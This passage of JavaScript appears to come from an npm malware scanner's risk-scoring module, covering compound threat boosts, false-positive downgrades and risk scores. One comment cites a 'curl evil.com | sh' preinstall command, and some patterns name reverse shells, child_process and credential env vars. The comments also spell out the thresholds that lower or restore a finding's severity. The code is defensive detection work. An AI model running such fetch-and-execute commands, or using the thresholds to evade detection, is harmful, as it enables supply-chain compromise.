  // body is otherwise legitimate pino code — only the injected file is malicious.
  // Each individual signal is already CRITICAL/HIGH but reachability/per-file scoring
  // can demote them. The compound recovers the signal when 2+ co-occur in the same file.
  {
    type: 'staged_remote_loader',
    requires: ['function_constructor_require', 'process_variable_shadow'],
    severity: 'CRITICAL',
    message: 'Function.constructor("require", body) + shadowed process env in same file — staged remote loader (chai-* / poxios-chain pattern). Payload fetched at runtime from external paste service.',
    fileFrom: 'function_constructor_require',
    sameFile: true
  },
];

// v2.11.11: Extract static require/import targets from a JS file (1 level).
// Returns a Set of relative file paths (normalized with forward slashes).
const _acorn = require('acorn');
const _acornWalk = require('acorn-walk');

function _extractStaticImports(filePath) {
  const imports = new Set();
  try {
    const content = require('fs').readFileSync(filePath, 'utf8');
    const ast = _acorn.parse(content, { sourceType: 'module', ecmaVersion: 'latest', allowReturnOutsideFunction: true, allowImportExportEverywhere: true });
    _acornWalk.simple(ast, {
      CallExpression(node) {
        if (node.callee.type === 'Identifier' && node.callee.name === 'require' &&
            node.arguments.length > 0 && node.arguments[0].type === 'Literal' &&
            typeof node.arguments[0].value === 'string') {
          const target = node.arguments[0].value;
          if (target.startsWith('.')) imports.add(target);
        }
      },
      ImportDeclaration(node) {
        if (node.source && typeof node.source.value === 'string' && node.source.value.startsWith('.')) {
          imports.add(node.source.value);
        }
      }
    });
  } catch { /* parse failure — return empty set */ }
  return imports;
}

// v2.11.11: Lifecycle scope resolution. Determines if a lifecycleScoped compound
// should fire based on whether the non-lifecycle threats are in the lifecycle
// target file or its direct static imports.
// Returns: 'pass' (compound should fire), 'skip' (no match in scope), 'unscoped' (can't resolve target)
const _NODE_FILE_RE = /\bnode\s+(?:\.\/)?([^\s"';&|]+\.(?:js|mjs|cjs))\b/;

function _resolveLifecycleScopeGate(compound, threats, targetPath) {
  const fs = require('fs');
  const pathMod = require('path');

  // 1. Extract lifecycle target files from lifecycle_script threats + package.json
  const lifecycleTargetFiles = new Set();
  const lifecycleThreats = threats.filter(t => t.type === 'lifecycle_script');
  for (const lt of lifecycleThreats) {
    const match = lt.message && _NODE_FILE_RE.exec(lt.message);
    if (match) lifecycleTargetFiles.add(match[1]);
  }

  // Also read package.json directly for robustness
  try {
    const pkgPath = pathMod.join(targetPath, 'package.json');
    if (fs.existsSync(pkgPath)) {
      const pkgData = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const scripts = pkgData.scripts || {};
      const LIFECYCLE_NAMES = ['preinstall', 'install', 'postinstall', 'preuninstall', 'postuninstall', 'prepare'];
      for (const name of LIFECYCLE_NAMES) {
        if (scripts[name]) {
          const m = _NODE_FILE_RE.exec(scripts[name]);
          if (m) lifecycleTargetFiles.add(m[1]);
        }
      }
    }
  } catch { /* ignore */ }

  // 2. If no target file extractable, return 'unscoped'
  if (lifecycleTargetFiles.size === 0) return 'unscoped';

  // 3. Build the scoped file set: target files + their 1-level static imports
  const scopedFiles = new Set();
  for (const relTarget of lifecycleTargetFiles) {
    const normalized = relTarget.replace(/\\/g, '/');
    scopedFiles.add(normalized);
    // Parse the target file and extract its static imports
    const absTarget = pathMod.resolve(targetPath, relTarget);
    const imports = _extractStaticImports(absTarget);
    for (const imp of imports) {
      // Resolve relative import against the target file's directory
      const impDir = pathMod.dirname(absTarget);
      let resolved = pathMod.relative(targetPath, pathMod.resolve(impDir, imp)).replace(/\\/g, '/');
      // Try with .js extension if not present
      if (!resolved.match(/\.(js|mjs|cjs)$/)) {
        if (fs.existsSync(pathMod.resolve(targetPath, resolved + '.js'))) {
          resolved += '.js';
        } else if (fs.existsSync(pathMod.resolve(targetPath, resolved, 'index.js'))) {
          resolved = resolved + '/index.js';
        }
      }
      scopedFiles.add(resolved);
    }
  }

  // 4. Check if any non-lifecycle required type has a threat in the scoped file set
  const nonLifecycleReqs = compound.requires.filter(r => r !== 'lifecycle_script');
  for (const req of nonLifecycleReqs) {
    const reqThreats = threats.filter(t => t.type === req && t.file);
    for (const t of reqThreats) {
      const normalizedFile = t.file.replace(/\\/g, '/');
      if (scopedFiles.has(normalizedFile)) return 'pass';
    }
  }

  return 'skip';
}

/**
 * Apply compound boost rules: inject synthetic CRITICAL threats when
 * co-occurring threat types indicate unambiguous malice.
 * Called AFTER applyFPReductions to recover individually-downgraded signals.
 * @param {Array} threats - deduplicated threat array (mutated in place)
 * @param {string} [targetPath] - scan target directory (for lifecycle scope resolution)
 */
function applyCompoundBoosts(threats, targetPath) {
  const typeSet = new Set(threats.map(t => t.type));

  // Build map of type → first file encountered (for file assignment)
  const typeFileMap = Object.create(null);
  for (const t of threats) {
    if (!typeFileMap[t.type]) {
      typeFileMap[t.type] = t.file || '(unknown)';
    }
  }

  for (const compound of SCORING_COMPOUNDS) {
    const compoundAlreadyPresent = typeSet.has(compound.type);

    // Check all required types are present
    if (!compound.requires.every(req => typeSet.has(req))) continue;

    // Severity gate: at least one component must have had original severity >= MEDIUM.
    // Uses originalSeverity (pre-FP-reduction) to prevent attackers from
    // manipulating compound gates via count-threshold or dist-file downgrades.
    const hasSignificantComponent = compound.requires.some(req =>
      threats.some(t => t.type === req && (t.originalSeverity || t.severity) !== 'LOW')
    );
    if (!hasSignificantComponent) continue;

    // FPR plan Chantier 7 : tighter severity gate. requireOriginalSeverityHigh
    // raises the bar from MEDIUM+ to HIGH+ on at least one component. Compounds
    // whose constituents are mostly heuristic (env_access, obfuscation_detected)
    // need HIGH+ to confirm a real signal versus framework noise.
    if (compound.requireOriginalSeverityHigh) {
      const hasHighOrigin = compound.requires.some(req =>
        threats.some(t => t.type === req && (
          (t.originalSeverity || t.severity) === 'HIGH' ||
          (t.originalSeverity || t.severity) === 'CRITICAL'
        ))
      );
      if (!hasHighOrigin) continue;
    }

    // FPR plan Chantier 7 : excludeIfBundled. When every required component
    // appears only in bundle files, the co-occurrence is bundler aggregation
    // (e.g. an HTTP client compiled into the same chunk as the credential-
    // handling code), not malice. lifecycle_script is package-level
    // (file = package.json) so it bypasses this gate naturally. Uses the
    // canonical BUNDLE_PATH_RE which covers dist/build/out/.yarn/releases/
    // assets/chunks/_app/fesm*/esm5/esm2015 etc. (vs the narrow DIST_FILE_RE).
    if (compound.excludeIfBundled) {
      const { BUNDLE_PATH_RE } = require('./shared/bundle-detect.js');
      const allComponentsBundled = compound.requires.every(req => {
        const fileBearingThreats = threats.filter(t => t.type === req && t.file && t.file !== 'package.json');
        if (fileBearingThreats.length === 0) return true; // package-level, ignore for bundle test
        return fileBearingThreats.every(t => BUNDLE_PATH_RE.test(t.file));
      });
      // Only skip when there is at least one file-bearing component AND all are bundled
      const anyFileBearing = compound.requires.some(req =>
        threats.some(t => t.type === req && t.file && t.file !== 'package.json')
      );
      if (anyFileBearing && allComponentsBundled) continue;
    }

    // v2.11.11: Lifecycle scope gate. For compounds with lifecycleScoped: true,
    // the non-lifecycle required type must have at least one threat in the file
    // directly executed by the lifecycle script OR in its static imports (1 level).
    // On monorepos, unscoped co-occurrence (lifecycle in package.json + exec in
    // scripts/release/publish.js) is noise. Fallback: when no target file can be
    // extracted (e.g. "npm run build"), the compound fires with severity capped
    // at HIGH and tagged unscopedCompound so the floor-50 logic skips it.
    if (compound.lifecycleScoped && targetPath) {
      const scopeResult = _resolveLifecycleScopeGate(compound, threats, targetPath);
      if (scopeResult === 'skip') continue;
      if (scopeResult === 'unscoped') {
        // Can't extract target file — fire but cap severity and tag
        if (!compoundAlreadyPresent) {
          const cappedSeverity = compound.severity === 'CRITICAL' ? 'HIGH' : compound.severity;
          threats.push({
            type: compound.type,
            severity: cappedSeverity,
            message: compound.message + ' (unscoped — lifecycle target not resolvable)',
            file: typeFileMap[compound.fileFrom] || '(unknown)',
            count: 1,
            compound: true,
            unscopedCompound: true
          });
          typeSet.add(compound.type);
        }
        continue; // skip the normal push below — already handled
      }
      // scopeResult === 'pass' — compound fires normally
    }

    // Same-file constraint: required types must appear in at least one common file.
    // sameFile: true = ALL required types must share a file.
    // sameFileTypes: [...] = only specified types must share a file.
    const sameFileCheck = compound.sameFileTypes || (compound.sameFile ? compound.requires : null);
    if (sameFileCheck) {
      const filesByType = sameFileCheck.map(req =>
        new Set(threats.filter(t => t.type === req).map(t => t.file))
      );
      const commonFiles = [...filesByType[0]].filter(f =>
        filesByType.every(s => s.has(f))
      );
      if (commonFiles.length === 0) continue;
    }

    if (!compoundAlreadyPresent) {
      threats.push({
        type: compound.type,
        severity: compound.severity,
        message: compound.message,
        file: typeFileMap[compound.fileFrom] || '(unknown)',
        count: 1,
        compound: true
      });
      typeSet.add(compound.type);
    }

    // Hybrid v3 Phase 3: tag constituent threats with replacedByCompound so
    // computeGroupScore* can suppress their score contribution (avoiding the
    // additive double-count of compound + constituents). Only tag instances
    // whose own severity is strictly LESS than the compound's severity —
    // otherwise the constituent already represents an equivalent or stronger
    // signal and dampening it would under-score real malware. Runs whether
    // the compound was just added or pre-existing (handles re-entry on
    // cached threats arrays).
    const compoundSevRank = _SEV_RANK[compound.severity];
    for (const req of compound.requires) {
      // Idempotency guard: if some instance of this required type is already
      // tagged for THIS compound, skip — a previous run already performed the
      // tagging for this (compound, requirement) pair.
      if (threats.some(t => t.type === req && t.replacedByCompound === compound.type)) continue;
      const inst = threats.find(t => t.type === req && !t.replacedByCompound);
      if (!inst) continue;
      const instSevRank = _SEV_RANK[inst.severity] ?? 0;
      if (instSevRank < compoundSevRank) inst.replacedByCompound = compound.type;
    }
  }
}

// Custom class prototypes that HTTP frameworks and common libraries legitimately extend.
// Distinguished from dangerous core Node.js prototype hooks.
// Audit v3: added WebSocket, EventEmitter, Buffer, Stream, Sender, Receiver — legitimate protocol/framework classes
const FRAMEWORK_PROTOTYPES = [
  'Request', 'Response', 'App', 'Router',
  'WebSocket', 'Sender', 'Receiver', 'EventEmitter',
  'Buffer', 'Stream', 'Readable', 'Writable', 'Transform', 'Duplex'
];
const FRAMEWORK_PROTO_RE = new RegExp(
  '^(' + FRAMEWORK_PROTOTYPES.join('|') + ')\\.prototype\\.'
);

function applyFPReductions(threats, reachableFiles, packageName, packageDeps, reachableFunctions) {
  // Initialize reductions audit trail on each threat
  // Store original severity before any FP reductions, so compound
  // severity gates can check pre-reduction severity (GAP 4b).
  for (const t of threats) {
    t.reductions = [];
    t.originalSeverity = t.severity;
  }

  // Count occurrences of each threat type (package-level, across all files)
  const typeCounts = {};
  for (const t of threats) {
    typeCounts[t.type] = (typeCounts[t.type] || 0) + 1;
  }

  // Mini Shai-Hulud (2026-05): pre-compute files that contain reachability-exempt
  // findings. Co-occurring threats in these files are also exempt from the
  // unreachable downgrade — the exempt finding proves structural malice.
  const _filesWithExemptThreats = new Set();
  for (const t of threats) {
    if (t.file && REACHABILITY_EXEMPT_TYPES.has(t.type)) {
      _filesWithExemptThreats.add(t.file.replace(/\\/g, '/'));
    }
  }

  const totalThreats = threats.length;

  // P4: Plugin loader pattern — packages with 5+ dynamic_require + dynamic_import combined
  // are legitimate plugin systems (webpack, eslint, karma, knex, jasmine, gatsby).
  // Threshold raised from >1 to >4 (audit fix: >1 was trivially exploitable).
  const pluginLoaderCount = (typeCounts.dynamic_require || 0) + (typeCounts.dynamic_import || 0);
  if (pluginLoaderCount > 4) {
    // Per-file: only downgrade in files that individually exceed threshold
    // Prevents attacker from distributing 5+ requires across files to downgrade all
    const perFilePluginCount = {};
    for (const t of threats) {
      if (t.type === 'dynamic_require' || t.type === 'dynamic_import') {
        const f = t.file || '(unknown)';
        perFilePluginCount[f] = (perFilePluginCount[f] || 0) + 1;
      }
    }
    for (const t of threats) {
      if ((t.type === 'dynamic_require' || t.type === 'dynamic_import') && t.severity === 'HIGH') {
        const f = t.file || '(unknown)';
        if (perFilePluginCount[f] > 4) {
          t.reductions.push({ rule: 'plugin_loader_per_file', from: 'HIGH', to: 'LOW' });
          t.severity = 'LOW';
        }
      }
    }
  }

  // Audit v3 B4: Identify dynamic_require instances targeting dangerous modules.
  // These must be immune to count-threshold dilution regardless of typeRatio.
  const DANGEROUS_MODULE_RE = /\b(child_process|net|dns|http|https|tls|dgram|cluster|vm)\b/;

  // Audit v3 B5: Identify files with network sinks (for env_access immunity).
  // env_access in a file containing a network sink is likely credential exfiltration.
  const networkSinkFiles = new Set();
  for (const t of threats) {
    if (t.type === 'suspicious_dataflow' || t.type === 'suspicious_module_sink' ||
        (t.type === 'cross_file_dataflow' && t.message && /network_send/.test(t.message))) {
      if (t.file) networkSinkFiles.add(t.file);
    }
  }

  for (const t of threats) {
    // Count-based downgrade: if a threat type appears too many times,
    // it's a framework/plugin system, not malware.
    // Percentage guard: only downgrade if the type is < 50% of total threats.
    // When a type dominates findings (> 50%), it may be real malware, not framework noise.
    const rule = FP_COUNT_THRESHOLDS[t.type];
    if (rule && typeCounts[t.type] > rule.maxCount && (!rule.from || t.severity === rule.from)) {
      // Audit v3 B4: Skip downgrade for dynamic_require targeting dangerous modules.
      // An attacker can inject 11+ benign dynamic_require to dilute, but any instance
      // resolved to child_process/net/dns/http must retain its severity.
      if (t.type === 'dynamic_require' && t.message && DANGEROUS_MODULE_RE.test(t.message)) {
        t.reductions.push({ rule: 'dangerous_module_immunity', note: 'retained — targets dangerous module' });
        continue;
      }

      // Audit v3 B5: Skip downgrade for env_access in files with network sinks.
      // Credentials read in the same file as a network send are exfiltration, not config.
      if (t.type === 'env_access' && t.file && networkSinkFiles.has(t.file)) {
        t.reductions.push({ rule: 'network_sink_immunity', note: 'retained — same file has network sink' });
        continue;
      }

      const typeRatio = typeCounts[t.type] / totalThreats;
      // suspicious_dataflow: bypass percentage guard when count exceeds threshold.
      // Packages with >3 suspicious_dataflow findings are always legitimate SDKs.
      // But a single suspicious_dataflow at 50% ratio should NOT be downgraded.
      // vm_code_execution: same logic — bypass only when count exceeds threshold.
      if (typeRatio < 0.4 ||
          (t.type === 'suspicious_dataflow' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'vm_code_execution' && typeCounts[t.type] > rule.maxCount) ||
          // Audit v3 B3: credential_regex_harvest always downgrades when count exceeds
          // threshold, regardless of ratio. HTTP parsers legitimately use 3+ credential regexes.
          (t.type === 'credential_regex_harvest' && typeCounts[t.type] > rule.maxCount) ||
          // Audit v3 B3: dynamic_require always downgrades when count exceeds threshold.
          // Plugin loaders (eslint, sails, karma) may have 100% dynamic_require findings.
          // The B4 dangerous_module_immunity above protects genuine threats.
          (t.type === 'dynamic_require' && typeCounts[t.type] > rule.maxCount) ||
          // Audit v3 B3: possible_obfuscation, unicode_variation_decoder, crypto_decipher
          // bypass ratio when count exceeds threshold — library noise patterns.
          (t.type === 'possible_obfuscation' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'unicode_variation_decoder' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'crypto_decipher' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'dangerous_call_function' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'dangerous_call_eval' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'proxy_data_intercept' && typeCounts[t.type] > rule.maxCount) ||
          // Audit v3 B3: env_access ratio bypass — B5 network_sink_immunity protects
          // env_access instances in files with network sinks. Remaining instances are config.
          (t.type === 'env_access' && typeCounts[t.type] > rule.maxCount)) {
        t.reductions.push({ rule: 'count_threshold', from: t.severity, to: rule.to });
        t.severity = rule.to;
      }
    }

    // require_cache_poison: single-hit downgrade removed.
    // The READ/WRITE distinction in ast-detectors already handles the FP case:
    // READ-only → LOW (hot-reload, introspection), WRITE → CRITICAL (malicious replacement).
    // A single cache WRITE is genuinely malicious — no downgrade needed.
  }

  // Dilution floor: retain at least one instance at original severity per type
  // to prevent complete count-threshold dilution by injected benign patterns.
  // Applies to types with low maxCount (≤3) AND either a `from` severity
  // constraint OR an explicit `floorEligible: true` opt-in (audit 2026-05 SC-C2).
  // High-count types (dynamic_require, env_access) represent legitimate framework
  // patterns and remain ineligible (no floor → full downgrade allowed).
  const restoredTypes = new Set();
  for (const t of threats) {
    const lastReduction = t.reductions?.find(r => r.rule === 'count_threshold');
    if (lastReduction && !restoredTypes.has(t.type)) {
      const rule = FP_COUNT_THRESHOLDS[t.type];
      if (rule && (rule.from || rule.floorEligible) && rule.maxCount <= 3) {
        t.severity = lastReduction.from;
        t.reductions = t.reductions.filter(r => r.rule !== 'count_threshold');
        t.reductions.push({ rule: 'count_threshold_floor', note: 'retained one instance at original severity' });
        restoredTypes.add(t.type);
      }
    }
  }

  for (const t of threats) {

    // Audit v3 B3: typosquat with LOW confidence → MEDIUM
    // LOW confidence means Levenshtein distance >= 2, less likely to be an actual typosquat.
    // Reduces score contribution from 10 (HIGH) to 3 (MEDIUM).
    if (t.type === 'typosquat_detected' && t.severity === 'HIGH' &&
        t.message && t.message.includes('Confidence: LOW')) {
      t.reductions.push({ rule: 'typosquat_low_confidence', from: 'HIGH', to: 'MEDIUM' });
      t.severity = 'MEDIUM';
    }

    // Audit v3: lifecycle_script with common build tool patterns → LOW
    // Native addon builders, husky, patch-package, tsc etc. are benign lifecycle usage
    if (t.type === 'lifecycle_script' && t.severity === 'MEDIUM') {
      const BENIGN_LIFECYCLE_RE = /\b(node-gyp|prebuild|cmake-js|cmake|napi|prebuildify|husky|patch-package|rimraf|mkdirp|cross-env|tsc\b|ngcc\b|esbuild\b|electron-builder|electron-rebuild|neon\b)/i;
      if (BENIGN_LIFECYCLE_RE.test(t.message)) {
        t.reductions.push({ rule: 'benign_lifecycle', from: 'MEDIUM', to: 'LOW' });
        t.severity = 'LOW';
      }
    }

    // Prototype hook: framework class prototypes → MEDIUM
    // Core Node.js prototypes (http.IncomingMessage, net.Socket) stay CRITICAL
    // Browser/native APIs (globalThis.fetch, XMLHttpRequest) stay HIGH
    if (t.type === 'prototype_hook' && t.severity === 'HIGH' &&
        FRAMEWORK_PROTO_RE.test(t.message)) {
      t.reductions.push({ rule: 'framework_prototype', from: 'HIGH', to: 'MEDIUM' });
      t.severity = 'MEDIUM';
    }

    // HTTP client prototype whitelist: packages with >20 prototype_hook hits
    // targeting HTTP class names are legitimate HTTP clients/frameworks.
    // Audit fix: narrowed regex — 'get','delete','command' matched getCredentials, deleteAccount.
    if (t.type === 'prototype_hook' && (t.severity === 'HIGH' || t.severity === 'CRITICAL') &&
        typeCounts.prototype_hook > 20) {
      const HTTP_PROTO_RE = /\b(Request|Response|IncomingMessage|ClientRequest|ServerResponse|fetch)\b/i;
      if (HTTP_PROTO_RE.test(t.message)) {
        t.reductions.push({ rule: 'http_client_whitelist', from: t.severity, to: 'MEDIUM' });
        t.severity = 'MEDIUM';
      }
    }

    // Audit v3 B3: Libraries with >10 prototype modifications that are still HIGH
    // after framework/HTTP checks are protocol implementations, not targeted attacks.
    // Applied AFTER framework_prototype and http_client_whitelist to preserve MEDIUM.
    if (t.type === 'prototype_hook' && t.severity === 'HIGH' &&
        typeCounts.prototype_hook > 10) {
      t.reductions.push({ rule: 'prototype_hook_count', from: 'HIGH', to: 'LOW' });
      t.severity = 'LOW';
    }

    // Dist/build/minified files: severity downgrade for bundler output.
    // Compound detections are exempt (DIST_EXEMPT_TYPES).
    // Bundler artifact types (eval, dynamic_require, obfuscation) get two-notch downgrade
    // (CRITICAL→MEDIUM, HIGH→LOW) since bundlers routinely produce these patterns.
    // Other non-exempt types keep one-notch downgrade.
    //
    // v2.10.73 P1: two changes to this gate :
    //  (a) Match either the narrow legacy DIST_FILE_RE OR the extended BUNDLE_PATH_RE
    //      from src/shared/bundle-detect.js (which adds .umd.js/.esm.js/.common.js/
    //      hash-chunks/fesm*/browser/assets/chunks/_app). Rationale : the narrow regex
    //      missed babylonjs/electron/@testim/@vanwei-wcs/etc. bundle files.
    //  (b) Before applying the downgrade, call hasBundleVetoSignal() — if the same
    //      file has a threat of type {staged_binary_payload, fetch_decrypt_exec,
    //      reverse_shell, node_modules_write, ...} OR an env_access on a sensitive env
    //      var (NPM_TOKEN, AWS_*, SSH_*, ...), BLOCK the downgrade. This preserves
    //      detection of event-stream / flatmap-stream style injections where malware
    //      is packed inside a legitimate-looking bundle.
    const isBundleFile = t.file && (DIST_FILE_RE.test(t.file) || BUNDLE_PATH_RE.test(t.file));
    if (isBundleFile && !DIST_EXEMPT_TYPES.has(t.type)) {
      // Veto check: don't downgrade if the bundle is suspected of injection
      if (hasBundleVetoSignal(threats, t.file)) {
        // Leave the threat at its original severity — the bundle contains a
        // suspicious co-occurring signal (staged payload, credential env read,
        // reverse shell, etc.) so all threats on this file stay un-downgraded.
        // Record it in reductions for audit trail.
        if (!t.reductions) t.reductions = [];
        t.reductions.push({ rule: 'bundle_veto_preserved', from: t.severity, to: t.severity });
      } else if (DIST_BUNDLER_ARTIFACT_TYPES.has(t.type)) {
        // Two-notch downgrade for bundler artifacts
        const fromSev = t.severity;
        if (t.severity === 'CRITICAL') t.severity = 'MEDIUM';
        else if (t.severity === 'HIGH') t.severity = 'LOW';
        else if (t.severity === 'MEDIUM') t.severity = 'LOW';
        if (t.severity !== fromSev) t.reductions.push({ rule: 'dist_file', from: fromSev, to: t.severity });
      } else {
        // One-notch downgrade for other non-exempt types
        const fromSev = t.severity;
        if (t.severity === 'CRITICAL') t.severity = 'HIGH';
        else if (t.severity === 'HIGH') t.severity = 'MEDIUM';
        else if (t.severity === 'MEDIUM') t.severity = 'LOW';
        if (t.severity !== fromSev) t.reductions.push({ rule: 'dist_file', from: fromSev, to: t.severity });
      }
    }

    // Reachability: findings in files not reachable from entry points → LOW
    // Exception: .d.ts files are never require()'d by JS but are executed by ts-node/tsx/bun.
    // Executable code in .d.ts is always malicious — exempt from unreachable downgrade.
    // Exception 2 (Mini Shai-Hulud, 2026-05): if the same file contains at least one
    // reachability-exempt finding (env_charcode_reconstruction, function_constructor_require,
    // etc.), all other findings in that file are also exempt. Rationale: the exempt
    // finding proves the file contains structurally malicious code, so co-occurring
    // signals (obfuscation, dataflow, credential harvest) are scoring-relevant regardless
    // of whether the file is reachable via require/import.
    const isDtsFile = t.file && t.file.endsWith('.d.ts');
    if (reachableFiles && reachableFiles.size > 0 && t.file &&
        !REACHABILITY_EXEMPT_TYPES.has(t.type) &&
        !isPackageLevelThreat(t) && !isDtsFile) {
      const normalizedFile = t.file.replace(/\\/g, '/');
      if (!reachableFiles.has(normalizedFile) && !_filesWithExemptThreats.has(normalizedFile)) {
        t.reductions.push({ rule: 'unreachable', from: t.severity, to: 'LOW' });
        t.severity = 'LOW';
        t.unreachable = true;
      }
      // FPR plan C2 : the file IS reachable but the surrounding function is
      // not. Only fires when reachableFunctions is provided (env-flagged) and
      // the threat carries a t.line (dataflow + anti-forensic emit lines ;
      // most other scanners do not, so this is a no-op for them).
      else if (reachableFunctions && typeof t.line === 'number' && t.line > 0) {
        const fnInfo = reachableFunctions.get(normalizedFile);
        if (fnInfo && !fnInfo.dynamic && Array.isArray(fnInfo.deadRanges)) {
          for (const range of fnInfo.deadRanges) {
            if (t.line >= range.startLine && t.line <= range.endLine) {
              if (t.severity !== 'LOW') {
                t.reductions.push({ rule: 'unreachable_function', from: t.severity, to: 'LOW' });
                t.severity = 'LOW';
              }
              t.unreachableFunction = range.name || true;
              break;
            }
          }
        }
      }
    }

    // C2: MCP server awareness — legitimate MCP servers write to MCP config files.
    // Downgrade mcp_config_injection to MEDIUM when @modelcontextprotocol/sdk is in dependencies.
    // Only dependencies (not devDependencies) — a real MCP server must ship the SDK.
    // High-confidence compound types stay untouched (lifecycle_shell_pipe, fetch_decrypt_exec, etc.)
    if (t.type === 'mcp_config_injection' && t.severity === 'CRITICAL' &&
        packageDeps && typeof packageDeps === 'object' &&
        packageDeps['@modelcontextprotocol/sdk']) {
      t.reductions.push({ rule: 'mcp_sdk', from: 'CRITICAL', to: 'MEDIUM' });
      t.severity = 'MEDIUM';
      t.mcpSdkDowngrade = true;
    }

    // C12: AI SDK awareness — env_access on AI API keys is expected in SDK packages.
    // Downgrade env_access HIGH → MEDIUM when @modelcontextprotocol/sdk, @anthropic/sdk,
    // or openai is in dependencies AND the env var is an AI provider key.
    // Does NOT affect compound detections (intent_credential_exfil stays CRITICAL).
    if (t.type === 'env_access' && t.severity === 'HIGH' &&
        packageDeps && typeof packageDeps === 'object') {
      const hasAiSdk = packageDeps['@modelcontextprotocol/sdk'] ||
                       packageDeps['@anthropic/sdk'] ||
                       packageDeps['openai'];
      if (hasAiSdk && /\b(ANTHROPIC_API_KEY|OPENAI_API_KEY|CLAUDE_API_KEY)\b/.test(t.message)) {
        t.reductions.push({ rule: 'ai_sdk_env', from: 'HIGH', to: 'MEDIUM' });
        t.severity = 'MEDIUM';
      }
    }
  }

  // Lifecycle-aware guard (C4): when lifecycle_script is present and not downgraded
  // to LOW (not a benign build tool), restore ONE count-threshold-downgraded instance
  // of high-intent types to MEDIUM. This prevents complete dilution of threat signals
  // in packages with install-time execution.
  // MUST run AFTER benign_lifecycle reduction to correctly detect LOW lifecycle_script.
  const LIFECYCLE_GUARD_TYPES = new Set([
    'obfuscation_detected', 'dynamic_require', 'dangerous_call_function',
    'dangerous_call_eval', 'staged_payload', 'env_access'
  ]);

  const lifecycleThreats = threats.filter(t => t.type === 'lifecycle_script');
  const hasActiveLifecycle = lifecycleThreats.length > 0 &&
    lifecycleThreats.some(t => t.severity !== 'LOW');

  if (hasActiveLifecycle) {
    const lifecycleGuardRestored = new Set();
    for (const t of threats) {
      if (LIFECYCLE_GUARD_TYPES.has(t.type) && !lifecycleGuardRestored.has(t.type)) {
        const wasDowngraded = t.reductions?.some(r => r.rule === 'count_threshold');
        if (wasDowngraded && t.severity === 'LOW') {
          t.severity = 'MEDIUM';
          t.reductions.push({ rule: 'lifecycle_guard', note: 'restored — lifecycle present' });
          lifecycleGuardRestored.add(t.type);
        }
      }
    }
  }
}

/**
 * Blue Team v8: Inject package-level boost threats that detect dissimulation patterns.
 * Called within calculateRiskScore after file scores are computed.
 * @param {Array} deduped - deduplicated threat array (mutated in place)
 * @param {Object} fileScores - map of file → score
 * @param {Map} fileGroups - map of file → threats array
 * @param {Array} packageLevelThreats - package-level threats
 */
function applyPackageLevelBoosts(deduped, fileScores, fileGroups, packageLevelThreats) {
  const fileNames = Object.keys(fileScores);
  const totalFiles = fileNames.length;

  // 1. isolated_suspicious_file: exactly 1 file has score > 0, 10+ files have score 0
  if (totalFiles >= 10) {
    const filesWithScore = fileNames.filter(f => fileScores[f] > 0);
    const filesWithZero = totalFiles - filesWithScore.length;
    if (filesWithScore.length === 1 && filesWithZero >= 10) {
      deduped.push({
        type: 'isolated_suspicious_file',
        severity: 'MEDIUM',
        message: `Single suspicious file among ${totalFiles} files — potential dissimulation pattern (malicious code hidden in clean package).`,
        file: filesWithScore[0],
        boostSignal: true
      });
    }
  }

  // 2. deep_suspicious_file: finding in a file at depth > 3 from package root
  for (const [file, threats] of fileGroups) {
    if (!file || file === '(unknown)') continue;
    const segments = file.replace(/\\/g, '/').split('/').filter(Boolean);
    if (segments.length > 3 && threats.some(t => t.severity !== 'LOW')) {
      deduped.push({
        type: 'deep_suspicious_file',
        severity: 'LOW',
        message: `Suspicious pattern found in deeply nested file (depth ${segments.length}): ${file} — potential hiding technique.`,
        file: file,
        boostSignal: true
      });
      break; // Only emit once per package
    }
  }
}

/**
 * Calculate per-file max risk score from deduplicated threats.
 * Formula: riskScore = min(100, max(file_scores + intent_bonus) + package_level_score)
 * @param {Array} deduped - deduplicated threat array
 * @param {Object} [intentResult] - optional result from buildIntentPairs()
 * @returns {Object} { riskScore, riskLevel, globalRiskScore, maxFileScore, packageScore, mostSuspiciousFile, fileScores, criticalCount, highCount, mediumCount, lowCount }
 */
function calculateRiskScore(deduped, intentResult) {
  // 1. Separate deduped threats into package-level and file-level
  const packageLevelThreats = [];
  const fileLevelThreats = [];
  // v2.10.73 P3: Degraded quick-scan threats get a separate bucket so they
  // contribute a bounded amount to the package score but never inflate max_file_score.
  // Exception: CRITICAL degraded threats (Module._load pattern) pass through normal
  // file-level processing — they are rare and nearly always malicious.
  const degradedNonCriticalThreats = [];
  for (const t of deduped) {
    if (t.degraded === true && t.severity !== 'CRITICAL') {
      degradedNonCriticalThreats.push(t);
    } else if (isPackageLevelThreat(t)) {
      packageLevelThreats.push(t);
    } else {
      fileLevelThreats.push(t);
    }
  }

  // 2. Group file-level threats by file
  const fileGroups = new Map();
  for (const t of fileLevelThreats) {
    const key = t.file || '(unknown)';
    if (!fileGroups.has(key)) fileGroups.set(key, []);
    fileGroups.get(key).push(t);
  }

  // 3. Compute per-file scores and find the most suspicious file
  let maxFileScore = 0;
  let mostSuspiciousFile = null;
  const fileScores = {};
  const fileHasMediumPlus = {}; // P4: track files with MEDIUM+ threats for cross-file bonus
  for (const [file, fileThreats] of fileGroups) {
    const score = computeGroupScore(fileThreats);
    fileScores[file] = score;
    fileHasMediumPlus[file] = fileThreats.some(t => t.severity !== 'LOW');
    if (score > maxFileScore) {
      maxFileScore = score;
      mostSuspiciousFile = file;
    }
  }

  // 4. Compute package-level score (typosquat, lifecycle, dependency IOC, etc.)
  let packageScore = computeGroupScore(packageLevelThreats);
  // Floor: CRITICAL package-level threats (lifecycle_shell_pipe, IOC match) → minimum HIGH (50)
  // A single "curl evil.com | sh" in preinstall = 25 points = MEDIUM without floor.
  // v2.11.11: unscopedCompound threats (lifecycle target not resolvable) are excluded from
  // the floor — they represent uncertain correlations that should not inflate the score.
  if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL' && !t.unscopedCompound)) {
    packageScore = Math.max(packageScore, 50);
  }
  // v2.10.94: Co-occurrence floor — 2+ distinct CRITICAL package-level types (different
  // threat types, not duplicates) is a near-unambiguous malware signature. Lifts to 75
  // (CRITICAL tier) so the final risk level reflects real severity instead of stopping
